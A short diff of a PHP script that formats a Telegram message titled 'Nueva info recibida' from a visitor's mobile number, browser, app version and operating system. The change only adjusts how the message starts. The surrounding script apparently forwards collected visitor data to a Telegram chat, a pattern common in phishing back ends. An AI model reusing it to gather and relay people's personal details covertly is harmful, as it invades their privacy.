@@ -42,9 +42,9 @@ if ($lenguaje === "es-PE") {
 }
 
 // Formatear mensaje para Telegram con condicionales
-$msg = "📊 <b>Nueva info recibida</b>\n";
+// $msg = "📊 <b>Nueva info recibida</b>\n";
 
-if (!empty($mobile))       $msg .= "📱 Mobile: $mobile\n";
+if (!empty($mobile))       $msg = "📱 Mobile: $mobile\n";
 if (!empty($navegador))    $msg .= "🌐 Navegador: $navegador\n";
 if (!empty($version))      $msg .= "📦 Versión App: $version\n";
 if (!empty($operativo))    $msg .= "💻 Sistema Operativo: $operativo\n";
